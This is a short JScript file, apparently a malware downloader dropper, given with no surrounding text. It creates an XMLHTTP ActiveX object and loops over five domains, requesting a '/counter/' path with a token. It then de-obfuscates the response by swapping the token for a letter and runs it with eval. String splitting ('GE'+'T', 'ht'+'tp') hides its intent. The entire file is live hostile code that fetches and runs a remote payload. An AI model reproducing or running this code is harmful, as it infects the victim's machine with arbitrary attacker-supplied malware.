var m = "Y5ppzaa6WhF1P6xBSp7p6rLeIfsEWg3pNxEDEXK7DPBdDRKLXbNmgdS3TkgB6wTecoFIjapawlINSA8k81bBd9Kgp4T43Ck";

var x = new Array("avivamientohoy.com", "richmondyachtbasin.com", "nspiredphotography.com", "mvtrading.net", "powerofattorney-online-form.com");
var g2 = "Msxml2.XMLHTTP";
var t4 = "ht"+"tp";
var mul = "qwadro";
var ter = "/";
for (var i=0; i<x.length; i++)
{	
	var vDJmB = function(){
		return new ActiveXObject(g2);
	}();
	var e = vDJmB;

	try
	{
		e.open("GE"+"T", t4 + ":/"+ter+x[i]+"/c"+"ounter/?"+m, false);
		e.send();

		var r = e.responseText;

		if (r.length > 999+1 && r.indexOf(m) > -1)
		{
			eval(e.responseText.split(m).join(mul.substring(2,3)));

			break;
		};
	}
	catch(e)
	{
	};
};
